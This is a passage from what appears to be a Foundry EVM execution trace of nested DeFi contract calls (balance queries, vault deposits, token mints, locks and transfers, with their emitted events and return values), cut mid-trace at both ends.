    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1537] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [794] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000006b2cb86333f170ffe12
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [10305] 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1173] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [433] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::totalSupply() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 10909322729467335744224 [1.09e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 10909322729467335744224 [1.09e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2627] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::totalToken() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1887] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::totalToken() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xa900A6291d3A49B1b555b40bd6277D56228B690b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 10909322729467335744224 [1.09e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000024f65441661ab6d1ae0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000024f65441661ab6d1ae0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [865] 0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8::userInfo(0, 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1193568351189769011833 [1.193e21], 7546058860083590777618 [7.546e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1274] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000040b4169b9c66de4279
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3050] 0xa8C9357dD25188f5E5954DC25509f92c44F38740::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [873] 0x07dE034A0Fc0DA7a0bf703F6DcA7025bcD61BA3e::userInfo(2, 0xa8C9357dD25188f5E5954DC25509f92c44F38740) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 24228113350502997257692 [2.422e22], 7408868011005831571933 [7.408e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xa8C9357dD25188f5E5954DC25509f92c44F38740) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000521689db63c86536ddc
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [405] 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96::baseToken() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [23162] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96, 273813118952403190627 [2.738e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x2B4f87D9d0A32A04B2D045fd5927cb57bEdB076e, to: 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96, value: 273813118952403190627 [2.738e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [237591] 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96::deposit()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 273813118952403190627 [2.738e20]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [74032] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::deposit(273813118952403190627 [2.738e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [73292] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::deposit(273813118952403190627 [2.738e20]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [8225] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96, 0xa900A6291d3A49B1b555b40bd6277D56228B690b, 273813118952403190627 [2.738e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96, to: 0xa900A6291d3A49B1b555b40bd6277D56228B690b, value: 273813118952403190627 [2.738e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xa900A6291d3A49B1b555b40bd6277D56228B690b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 11183135848419738934851 [1.118e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [13481] 0x9f4a385d598f6ec7DD39a2f7d56787aFe7FF0525::getInterestRate(0, 10909322729467335744224 [1.09e22]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [6235] 0x82B49Ee3eCA21652e4903df992Adc8C6C1B6C265::getInterestRate(0, 10909322729467335744224 [1.09e22]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [832] 0x6f90B3c8c57b518e44eeEdFA10E1dc5783Fb02c9::getInterestRate(0, 10909322729467335744224 [1.09e22]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3084] 0x9f4a385d598f6ec7DD39a2f7d56787aFe7FF0525::getReservePoolBps() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2344] 0x82B49Ee3eCA21652e4903df992Adc8C6C1B6C265::getReservePoolBps() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000000003e8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000000003e8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xa900A6291d3A49B1b555b40bd6277D56228B690b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 11183135848419738934851 [1.118e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96, value: 273813118952403190627 [2.738e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Deposit(: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, : 273813118952403190627 [2.738e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1274] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 273813118952403190627 [2.738e20]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 273813118952403190627 [2.738e20]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [156610] 0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8::deposit(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96, 0, 273813118952403190627 [2.738e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3274] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::balanceOf(0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2531] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::balanceOf(0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 10834558769389169111158 [1.083e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 10834558769389169111158 [1.083e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [19543] 0x9E95cB3D0560f9Cba88991f828322526851BFb56::mint(0x51eE7ff6727e40E21A7a32CDeeC2539ce094b372, 25475380227913556368 [2.547e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x51eE7ff6727e40E21A7a32CDeeC2539ce094b372, value: 25475380227913556368 [2.547e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [10743] 0x9E95cB3D0560f9Cba88991f828322526851BFb56::mint(0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8, 135868694548872300632 [1.358e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8, value: 135868694548872300632 [1.358e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [26863] 0x9E95cB3D0560f9Cba88991f828322526851BFb56::lock(0x51eE7ff6727e40E21A7a32CDeeC2539ce094b372, 20380304182330845094 [2.038e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x51eE7ff6727e40E21A7a32CDeeC2539ce094b372, to: 0x9E95cB3D0560f9Cba88991f828322526851BFb56, value: 20380304182330845094 [2.038e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Lock(param0: 0x51eE7ff6727e40E21A7a32CDeeC2539ce094b372, param1: 20380304182330845094 [2.038e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [556] 0x9E95cB3D0560f9Cba88991f828322526851BFb56::balanceOf(0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 73079243785522017880015 [7.307e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [556] 0x9E95cB3D0560f9Cba88991f828322526851BFb56::balanceOf(0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 73079243785522017880015 [7.307e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [8137] 0x9E95cB3D0560f9Cba88991f828322526851BFb56::transfer(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96, 14967713699793130918 [1.496e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8, to: 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96, value: 14967713699793130918 [1.496e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [13263] 0x9E95cB3D0560f9Cba88991f828322526851BFb56::lock(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96, 11974170959834504734 [1.197e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96, to: 0x9E95cB3D0560f9Cba88991f828322526851BFb56, value: 11974170959834504734 [1.197e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Lock(param0: 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96, param1: 11974170959834504734 [1.197e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [14447] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::transferFrom(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96, 0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8, 273813118952403190627 [2.738e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [13695] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::transferFrom(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96, 0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8, 273813118952403190627 [2.738e20]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96, to: 0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8, value: 273813118952403190627 [2.738e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96, spender: 0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8, value: 115792089237316195423570985008687907853269984665640563508084343255598210410504 [1.157e77])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Deposit(user: 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96, pid: 0, amount: 273813118952403190627 [2.738e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Deposit(: 0xa900A6291d3A49B1b555b40bd6277D56228B690b, : 273813118952403190627 [2.738e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [27298] 0x2B4f87D9d0A32A04B2D045fd5927cb57bEdB076e::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [11176] 0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1104] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [364] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::totalSupply() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 793300839274045174646136 [7.933e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 793300839274045174646136 [7.933e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2846] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::totalToken() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2106] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::totalToken() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xd7D069493685A581d27824Fc46EdA46B7EfC0063) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 5640626957589713000405 [5.64e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000572d1c8d1e188103eb53
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000572d1c8d1e188103eb53
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1285] 0xA625AB01B08ce023B2a342Dbb12a16f2C8489A8F::userInfo(1, 0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 60955393982519636743013 [6.095e22], 2826042283495043367339022 [2.826e24]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1537] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [794] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000006b2cb86333f170ffe12
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [10305] 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1173] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [433] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::totalSupply() [delegatecall]
